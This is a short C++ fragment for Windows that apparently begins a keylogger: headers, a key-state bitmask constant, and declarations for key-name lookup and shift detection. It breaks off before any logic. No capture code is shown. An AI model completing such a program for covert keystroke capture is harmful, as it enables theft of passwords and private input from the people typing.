#include<iostream>
#include<stdio.h>
#include<stdlib.h>
#include <windows.h>
#include <Winuser.h>
#include <string>
#include <fstream>
using namespace std;
const int KeyBoardValue = 0x80000000;
string GetKeyName(int);
bool JudgeShift();